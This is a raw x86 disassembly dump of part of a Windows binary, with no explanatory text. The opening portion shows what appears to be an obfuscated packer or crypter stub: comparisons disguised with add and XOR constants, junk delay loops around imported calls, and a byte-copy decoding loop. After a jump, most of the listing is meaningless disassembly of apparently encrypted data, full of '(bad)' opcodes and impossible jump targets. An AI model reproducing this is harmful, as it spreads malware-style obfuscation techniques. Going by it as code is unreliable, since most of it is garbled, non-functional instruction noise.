  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427de1
  41d28a:	mov    ecx,DWORD PTR ds:0x429ea5
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x42fa2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x42fa38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x42fa3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ebx],ah
  41d514:	mov    ecx,0xfe62b2a8
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2+0x552ca77b],1
  41d522:	(bad)  
  41d523:	jbe    0x41d4ec
  41d525:	aam    0x8
  41d527:	mov    al,ds:0x268c5cfd
  41d52c:	call   0xfb3be27e
  41d531:	mov    dh,0xe5
  41d533:	and    eax,0x57d49ee3
  41d538:	jle    0x41d55b
  41d53a:	cmp    ebx,ebp
  41d53c:	jno    0x41d535
  41d53e:	mov    cl,0x38
  41d540:	xchg   ebp,eax
  41d541:	add    al,0xfb
  41d543:	(bad)
  41d546:	test   eax,0x3428f77d
  41d54b:	ins    DWORD PTR es:[edi],dx
  41d54c:	outs   dx,BYTE PTR ds:[esi]
  41d54d:	xor    DWORD PTR [edx-0x37],esp
  41d550:	jo     0x41d4d6
  41d552:	mov    esi,0x80d5d9a7
  41d557:	adc    edx,esp
  41d559:	outs   dx,BYTE PTR ds:[esi]
  41d55a:	mov    dl,0x2b
  41d55c:	stos   DWORD PTR es:[edi],eax
  41d55d:	std    
  41d55e:	nop
  41d55f:	xor    eax,0xc8174b03
  41d564:	mov    dh,BYTE PTR [ecx]
  41d566:	add    al,0x62
  41d568:	(bad)  
  41d569:	mov    esp,DWORD PTR [esi+ebp*2-0x739e0e19]
  41d570:	and    BYTE PTR [ebp+ecx*2+0x51054231],dh
  41d577:	push   esp
  41d578:	loop   0x41d50d
  41d57a:	imul   ecx,DWORD PTR [edi-0x3015977c],0x16c8dbdc
  41d584:	test   BYTE PTR [ebx-0x583955d],ah
  41d58a:	mov    ebx,0xdb24a995
  41d58f:	mov    esp,0x7d68f55e
  41d594:	je     0x41d5a6
  41d596:	mov    WORD PTR [edi],gs
  41d598:	xor    eax,0xb67f458d
  41d59d:	dec    edx
  41d59e:	sbb    DWORD PTR [esi-0x6e],esi
  41d5a1:	sbb    eax,0x6a05d050
  41d5a6:	repz push ebp
  41d5a8:	pop    edi
  41d5a9:	xchg   DWORD PTR [esi+0x6e6da1f],esp
  41d5af:	jne    0x41d562
  41d5b1:	mov    ecx,eax
  41d5b3:	mov    fs,WORD PTR [edi]
  41d5b5:	xor    dl,BYTE PTR [eax]
  41d5b7:	scas   eax,DWORD PTR es:[edi]
  41d5b8:	adc    al,0xf5
  41d5ba:	push   0x85ee9f62
  41d5bf:	aad    0x54
  41d5c1:	scas   al,BYTE PTR es:[edi]
  41d5c2:	(bad)  
  41d5c3:	fistp  WORD PTR [ebx]
  41d5c5:	loope  0x41d60a
  41d5c7:	jo     0x41d564
  41d5c9:	jecxz  0x41d5a6
  41d5cb:	aaa    
  41d5cc:	inc    ebp
  41d5cd:	mov    dh,0x6d
  41d5cf:	dec    ecx
  41d5d0:	pushf  
  41d5d1:	jno    0x41d606
  41d5d3:	and    DWORD PTR [edi-0x42f81099],edx
  41d5d9:	mov    ds:0x46d44405,al
  41d5de:	fmul   QWORD PTR [edx+0x78]
  41d5e1:	fs daa 
  41d5e3:	in     al,dx
  41d5e4:	fs dec esp
  41d5e6:	ret    
  41d5e7:	xchg   ecx,eax
  41d5e8:	add    ah,BYTE PTR [ebp-0x68]
  41d5eb:	push   ebx
  41d5ec:	push   esp
  41d5ed:	xchg   DWORD PTR [edx-0x23],edi
  41d5f0:	dec    edi
  41d5f1:	xor    eax,0xc8aad5e5
  41d5f6:	dec    edi
  41d5f7:	lock xor ah,BYTE PTR [edx]
  41d5fa:	test   BYTE PTR [eax],ah
  41d5fc:	addr16 mov bh,0x48
  41d5ff:	pop    ss
  41d600:	retf   
  41d601:	ja     0x41d66e
  41d603:	and    eax,0xcd431379
  41d608:	dec    edx
  41d609:	xchg   ebx,eax
  41d60a:	sbb    al,0xe5
  41d60c:	fild   DWORD PTR [ecx+eiz*8]
  41d60f:	dec    edi
  41d610:	imul   esi,esi,0xffffffe5
  41d613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d614:	cdq    
  41d615:	shl    bl,0x91
  41d618:	les    edx,FWORD PTR ds:0xe5509545
  41d61e:	rep stos BYTE PTR es:[edi],al
  41d620:	dec    esp
  41d621:	aad    0x9b
  41d623:	ins    BYTE PTR es:[di],dx
  41d625:	loop   0x41d693
  41d627:	add    BYTE PTR [edi+0x7b],0xc2
  41d62b:	xchg   esp,eax
  41d62c:	lods   al,BYTE PTR ds:[esi]
  41d62d:	ds ss push edi
  41d630:	and    eax,0xfd0f0763
  41d635:	int3   
  41d636:	(bad)  
  41d637:	shr    BYTE PTR [edi+esi*1+0x4b],1
  41d63b:	out    0xd8,al
  41d63d:	push   0xfffffff6
  41d63f:	sbb    dl,dl
  41d641:	aas    
  41d642:	pop    ss
  41d643:	mov    DWORD PTR [edx+0x5c],esp
  41d646:	sbb    eax,ebp
  41d648:	mov    ah,0x89
  41d64a:	cmp    BYTE PTR [eax+0x2d],ah
  41d64d:	inc    edx
  41d64e:	xor    al,0x52
  41d650:	daa    
  41d651:	fimul  DWORD PTR [eax-0x4db00f69]
  41d657:	into   
  41d658:	dec    edx
  41d659:	sub    DWORD PTR [eax],ebp
  41d65b:	dec    ecx
  41d65c:	push   cs
  41d65d:	daa    
  41d65e:	(bad)  
  41d65f:	bound  edx,QWORD PTR [ecx+0x59]
  41d662:	or     al,0x95
  41d664:	mov    eax,?
  41d666:	jno    0x41d629
  41d668:	mov    bh,0x7b
  41d66a:	cmp    DWORD PTR [edx-0xc],ecx
  41d66d:	mov    ecx,0x81419ff2
  41d672:	neg    DWORD PTR [edi]
  41d674:	imul   esp,ebp,0xffffffd4
  41d677:	adc    eax,0x5c97aa71
  41d67c:	sub    dl,dh
  41d67e:	push   ds
  41d67f:	xor    eax,DWORD PTR [ecx-0x2cda7737]
  41d685:	fiadd  DWORD PTR [edx]
  41d687:	pop    eax
  41d688:	out    0x6,eax
  41d68a:	fwait
  41d68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d68c:	daa    
  41d68d:	imul   ebx,DWORD PTR [ecx+0x58],0x10
  41d691:	or     al,0xb7
  41d693:	and    eax,0xbb9e953f
  41d698:	popf   
  41d699:	pop    ss
  41d69a:	pop    ds
  41d69b:	(bad)  
  41d69c:	out    dx,eax
  41d69d:	lods   al,BYTE PTR ds:[esi]
  41d69e:	ins    DWORD PTR es:[edi],dx
  41d69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a0:	mov    ebx,0x3c60da55
  41d6a5:	sub    al,0xc7
  41d6a7:	daa    
  41d6a8:	std    
  41d6a9:	jge    0x41d6ba
  41d6ab:	inc    ebx
  41d6ac:	iret   
  41d6ad:	dec    esp
  41d6ae:	or     BYTE PTR [edi+edx*1],al
  41d6b1:	lock shr BYTE PTR [ecx-0x71aee75],cl
  41d6b8:	sub    al,0x10
  41d6ba:	mov    WORD PTR [ebx],es
  41d6bc:	inc    BYTE PTR [edx-0x73]
  41d6bf:	xabort 0x7c
  41d6c2:	mov    dh,0xc8
  41d6c4:	cwde   
  41d6c5:	in     al,0x56
  41d6c7:	scas   eax,DWORD PTR es:[edi]
  41d6c8:	pusha  
  41d6c9:	fisttp WORD PTR [edi-0x7]
  41d6cc:	sub    ebx,0x3fee5133
  41d6d2:	and    DWORD PTR [esi],eax
  41d6d4:	fwait
  41d6d5:	div    DWORD PTR [edi+edi*1]
  41d6d8:	mov    BYTE PTR [esi+0x1d23bcb7],ah
  41d6de:	(bad)  
  41d6df:	shl    bl,1
  41d6e1:	neg    DWORD PTR [esi-0x22]
  41d6e4:	push   eax
  41d6e5:	push   esi
  41d6e6:	cmovl  eax,DWORD PTR cs:[esi+edi*4+0x58]
  41d6ec:	aas    
  41d6ed:	retf   
  41d6ee:	sbb    ah,ch
  41d6f0:	dec    esp
  41d6f1:	pop    ss
  41d6f2:	int3   
  41d6f3:	loopne 0x41d6a6
  41d6f5:	hlt    
  41d6f6:	aaa    
  41d6f7:	rcl    BYTE PTR [esi-0x25],cl
  41d6fa:	sub    edx,edx
  41d6fc:	jge    0x41d710
  41d6fe:	out    0x48,al
  41d700:	cmp    al,0x68
  41d702:	out    0x10,eax
  41d704:	mov    ah,0x8
  41d706:	not    BYTE PTR [edx+0x72eaba9c]
  41d70c:	rcr    esi,cl
  41d70e:	fimul  WORD PTR [eax]
  41d710:	push   esp
  41d711:	pop    esi
  41d712:	cmp    al,0xc8
  41d714:	jecxz  0x41d705
  41d716:	les    eax,FWORD PTR [edi-0x63]
  41d719:	xchg   edi,eax
  41d71a:	sbb    bl,BYTE PTR [eax]
  41d71c:	addr16 hlt 
  41d71e:	add    esi,DWORD PTR [edx]
  41d720:	ret    0x626
  41d723:	sbb    cl,BYTE PTR [ecx+0x30e8eae2]
  41d729:	and    edx,edi
  41d72b:	and    DWORD PTR [ecx],esp
  41d72d:	(bad)  
  41d72e:	mov    fs,esp
  41d730:	mov    al,0xad
  41d732:	jl     0x41d799
  41d734:	imul   ebx,DWORD PTR [edi-0x76a054b1],0xceac1194
  41d73e:	data16 xlat BYTE PTR ds:[ebx]
  41d740:	daa    
  41d741:	enter  0xd481,0x2d
  41d745:	push   edi
  41d746:	shl    dh,0x3
  41d749:	sbb    al,0x79
  41d74b:	(bad)  
  41d74c:	sahf   
  41d74d:	shl    DWORD PTR [esi-0x663fd41],1
  41d753:	dec    edi
  41d754:	xchg   ecx,eax
  41d755:	inc    eax
  41d756:	in     eax,dx
  41d757:	jl     0x41d7c7
  41d759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d75a:	int    0xf9
  41d75c:	aam    0x9d
  41d75e:	sub    eax,0x6688b162
  41d763:	xor    al,0xef
  41d765:	adc    bl,BYTE PTR [eax-0x6a1cc8fe]
  41d76b:	sbb    al,0xdb
  41d76d:	xchg   esp,eax
  41d76e:	and    eax,0xb56f76f2
  41d773:	(bad)  [ecx+edx*4+0x60]
  41d777:	outs   dx,DWORD PTR ds:[esi]
  41d778:	xchg   edi,eax
  41d779:	cld    
  41d77a:	rol    BYTE PTR [eax+0x3c],0xc8
  41d77e:	js     0x41d758
  41d780:	(bad)  
  41d781:	out    dx,eax
  41d782:	nop
  41d783:	in     al,0xe7
  41d785:	mov    edx,ss
  41d787:	mov    ebx,0xaca9ba10
  41d78c:	loopne 0x41d7af
  41d78e:	mov    ebx,0x6f339e27
  41d793:	scas   eax,DWORD PTR es:[edi]
  41d794:	cs mov al,0xa4
  41d797:	call   0xb55ca224
  41d79c:	push   ebx
  41d79d:	sbb    eax,0x93e8663
  41d7a2:	fs push ss
  41d7a4:	scas   eax,DWORD PTR es:[edi]
  41d7a5:	pop    ebx
  41d7a6:	in     eax,0xf2
  41d7a8:	jne    0x41d74d
  41d7aa:	popa   
  41d7ab:	cmp    DWORD PTR [edx+0x3e],ebx
  41d7ae:	mov    esi,0x4b9e7d20
  41d7b3:	outs   dx,BYTE PTR ds:[esi]
  41d7b4:	pop    edi
  41d7b5:	data16 hlt 
  41d7b7:	pusha  
  41d7b8:	pop    ecx
  41d7b9:	std    
  41d7ba:	or     eax,0xf510ac9f
  41d7bf:	aaa    
  41d7c0:	repz lea edx,[edi]
  41d7c3:	mov    ds:0x18f7953d,eax
  41d7c8:	rcl    BYTE PTR [edi+0x767f685],1
  41d7ce:	in     al,dx
  41d7cf:	and    al,0x7a
  41d7d1:	enter  0xce9c,0xec
  41d7d5:	imul   ebx,DWORD PTR [edx],0x48
  41d7d8:	or     eax,0xf2ba98d6
  41d7dd:	push   ecx
  41d7de:	test   esp,eax
  41d7e0:	test   al,dh
  41d7e2:	scas   eax,DWORD PTR es:[edi]
  41d7e3:	or     ecx,ecx
  41d7e5:	jp     0x41d7e1
  41d7e7:	mov    ecx,0x9873987e
  41d7ec:	out    dx,al
  41d7ed:	(bad)  
  41d7ee:	arpl   WORD PTR [edx],dx
  41d7f0:	and    bl,ah
  41d7f2:	mov    ds:0x7fda111,al
  41d7f7:	mov    al,0x40
  41d7f9:	push   0xffffffd5
  41d7fb:	xchg   DWORD PTR [esi+0x565f9ea5],esi
  41d801:	(bad)
  41d805:	sbb    edi,esp
  41d807:	mov    edi,0xfaeffd43
  41d80c:	hlt    
  41d80d:	stos   BYTE PTR es:[edi],al
  41d80e:	or     eax,edx
  41d810:	mov    ah,0xad
  41d812:	push   eax
  41d813:	and    bh,BYTE PTR [esi]
  41d815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d816:	push   ebp
  41d817:	adc    esi,DWORD PTR [ebp+0x4d]
  41d81a:	cs retf 
  41d81c:	xchg   ebx,eax
  41d81d:	pushf  
  41d81e:	retf   0x1439
  41d821:	inc    ebp
  41d822:	daa    
  41d823:	je     0x41d7de
  41d825:	jmp    DWORD PTR [edx]
  41d827:	in     eax,dx
  41d828:	or     eax,0xa628ea6b
  41d82d:	int3   
  41d82e:	mov    al,0x2d
  41d830:	mov    esp,0x73af4139
  41d835:	in     eax,dx
  41d836:	mov    DWORD PTR [esi],ecx
  41d838:	pushf  
  41d839:	or     bh,BYTE PTR [esi+0x9]
  41d83c:	dec    edi
  41d83d:	jbe    0x41d7f1
  41d83f:	or     eax,0x5b297ad3
  41d844:	call   0x133a40b1
  41d849:	mov    BYTE PTR [edi],bh
  41d84b:	not    DWORD PTR [eax]
  41d84d:	les    esp,FWORD PTR [edx-0x14bf7af2]
  41d853:	mov    ch,0xde
  41d855:	lds    ecx,FWORD PTR [edi+0x78]
  41d858:	or     al,BYTE PTR [eax+0x6f2d7999]
  41d85e:	push   edi
  41d85f:	fiadd  DWORD PTR [esi-0x1d587e9b]
  41d865:	jbe    0x41d823
  41d867:	xor    edx,DWORD PTR [esi]
  41d869:	add    dl,BYTE PTR [edx+0x8]
  41d86c:	mov    ebx,0x3631a309
  41d871:	mul    BYTE PTR [ebx-0x3b3ef3d5]
  41d877:	mov    ecx,0xe414bc9f
  41d87c:	and    BYTE PTR [edx+esi*1],bh
  41d87f:	or     ebx,DWORD PTR [edx-0x3d]
  41d882:	push   edx
  41d883:	or     al,0x2f
  41d885:	sub    edx,DWORD PTR [edx+esi*2]
  41d888:	pop    es
  41d889:	pop    es
  41d88a:	add    esp,esp
  41d88c:	add    al,0x70
  41d88e:	es fnsave cs:[ebx]
  41d892:	repz sub esp,DWORD PTR [ecx+0x2096f060]
  41d899:	lahf   
  41d89a:	icebp  
  41d89b:	call   0xa4e744fb
  41d8a0:	pop    esi
  41d8a1:	xor    DWORD PTR [ebx+0x7d5dcd5],edi
  41d8a7:	enter  0xbdf9,0xe2
  41d8ab:	cmp    eax,0xd4a84f7e
  41d8b0:	xchg   DWORD PTR [ecx-0x69da5b28],ebx
  41d8b6:	imul   ebp,edx,0xc1858b00
  41d8bc:	or     eax,esi
  41d8be:	lods   eax,DWORD PTR ds:[esi]
  41d8bf:	rcl    DWORD PTR [eax],1
  41d8c1:	and    DWORD PTR [ecx+0x39cf55ec],esp
  41d8c7:	aas    
  41d8c8:	lea    edi,[ebx+eiz*8]
  41d8cb:	jl     0x41d908
  41d8cd:	mov    ds:0xee12168a,al
  41d8d2:	inc    esp
  41d8d3:	xor    al,0x44
  41d8d5:	jbe    0x41d85d
  41d8d7:	add    al,0x61
  41d8d9:	lds    ebp,FWORD PTR [ecx]
  41d8db:	fsub   DWORD PTR [esi-0x2386b70c]
  41d8e1:	cs ret 0x282f
  41d8e5:	sub    BYTE PTR [edx],0xc8
  41d8e8:	dec    ebp
  41d8e9:	jge    0x41d947
  41d8eb:	inc    ebx
  41d8ec:	and    esp,DWORD PTR [ebx]
  41d8ee:	mov    esp,0x326374d6
  41d8f3:	push   0x68
  41d8f5:	adc    DWORD PTR [edi+eax*2+0x2b3857a1],ebp
  41d8fc:	rcl    DWORD PTR [eax],1
  41d8fe:	fnstcw WORD PTR [ebp-0x1709d2da]
  41d904:	test   BYTE PTR [edi-0x2da9b400],0x1
  41d90b:	daa    
  41d90c:	sub    DWORD PTR [esi+0x6c],edx
  41d90f:	shl    DWORD PTR [eax],1
  41d911:	daa    
  41d912:	push   cs
  41d913:	sub    bh,BYTE PTR [esi+0x3ec4496c]
  41d919:	jmp    0x87604614
  41d91e:	adc    DWORD PTR [ebp-0xe9d5904],ecx
  41d924:	add    eax,0x625d3b37
  41d929:	sbb    eax,DWORD PTR [edx]
  41d92b:	push   ds
  41d92c:	ja     0x41d8dd
  41d92e:	adc    al,BYTE PTR [edx+0x15b5895f]
  41d934:	jmp    0x9172162e
  41d939:	jle    0x41d919
  41d93b:	lahf   
  41d93c:	or     cl,BYTE PTR [ebp+0x6f]
  41d93f:	scas   eax,DWORD PTR es:[edi]
  41d940:	pop    edi
  41d941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d942:	shl    DWORD PTR [ebx-0x3c87b6d6],0x7b
  41d949:	imul   ebx,ecx,0x54
  41d94c:	adc    al,0xb4
  41d94e:	(bad)  
  41d951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d952:	imul   edi,DWORD PTR [eax+0x50],0x13854d96
  41d959:	popa   
  41d95a:	push   edx
  41d95b:	iret   
  41d95c:	mov    edx,0xf41ff3a7
  41d961:	adc    eax,0x76c06365
  41d966:	inc    ebx
  41d967:	retf   0x1e0f
  41d96a:	mov    al,0x41
  41d96c:	or     al,0x1a
  41d96e:	sahf   
  41d96f:	jmp    0x41d946
  41d971:	jnp    0x41d922
  41d973:	mov    ebx,DWORD PTR [eax]
  41d975:	(bad)  
  41d976:	xor    eax,0xc72f488a
  41d97b:	add    DWORD PTR [ecx-0x4c746054],ebx
  41d981:	inc    ecx
  41d982:	push   edx
  41d983:	cmp    al,0x7
  41d985:	cwde   
  41d986:	or     al,0x8f
  41d988:	lds    ebp,FWORD PTR [edx+0x73c68384]
  41d98e:	inc    ecx
  41d98f:	jge    0x41d965
  41d991:	adc    BYTE PTR [bx-0x2e],cl
  41d995:	div    BYTE PTR [ebx+0x2e]
  41d998:	xchg   ebp,eax
  41d999:	sahf   
  41d99a:	push   0x6a
  41d99c:	push   ecx
  41d99d:	mov    eax,ds:0x9012264d
  41d9a2:	xchg   esp,eax
  41d9a3:	stos   BYTE PTR es:[edi],al
  41d9a4:	inc    edx
  41d9a5:	mov    al,ds:0x4776fe82
  41d9aa:	stc    
  41d9ab:	mov    BYTE PTR [edx+0x5b],dh
  41d9ae:	jg     0x41d98f
  41d9b0:	jecxz  0x41d99b
  41d9b2:	data16 jg 0x41d9ae
  41d9b5:	cmp    BYTE PTR ss:[edx+0x31],0xf0
  41d9ba:	sub    BYTE PTR [ebx+edx*4+0x68df8a0e],bl
  41d9c1:	div    DWORD PTR [ecx]
  41d9c3:	arpl   WORD PTR [ecx+eiz*1-0x56],bx
  41d9c7:	inc    dx
  41d9c9:	lds    ecx,FWORD PTR [eax+0x3a]
  41d9cc:	test   al,ch
  41d9ce:	daa    
  41d9cf:	push   ebp
  41d9d0:	repnz inc bp
  41d9d3:	push   eax
  41d9d4:	xchg   edi,eax
  41d9d5:	sahf   
  41d9d6:	add    al,0xfc
  41d9d8:	or     dh,BYTE PTR [eax]
  41d9da:	sbb    DWORD PTR [esi-0x69],edx
  41d9dd:	ja     0x41d99b
